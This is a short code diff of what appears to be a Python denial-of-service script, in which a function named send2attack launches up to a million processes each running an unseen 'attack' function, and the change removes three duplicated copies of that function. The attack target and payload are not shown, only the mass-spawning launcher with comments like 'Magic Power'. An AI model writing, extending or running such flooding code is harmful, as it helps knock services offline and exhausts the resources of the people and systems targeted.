@@ -64,24 +64,6 @@ def send2attack():
     mp = multiprocessing.Process(target=attack)
     mp.setDaemon = False
     mp.start() #Magic Starts
-    
-def send2attack():
-  for i in range(1000000): #Magic Power
-    mp = multiprocessing.Process(target=attack)
-    mp.setDaemon = False
-    mp.start() #Magic Starts
-    
-def send2attack():
-  for i in range(1000000): #Magic Power
-    mp = multiprocessing.Process(target=attack)
-    mp.setDaemon = False
-    mp.start() #Magic Starts
-    
-def send2attack():
-  for i in range(1000000): #Magic Power
-    mp = multiprocessing.Process(target=attack)
-    mp.setDaemon = False
-    mp.start() #Magic Starts
 
     
 send2attack()
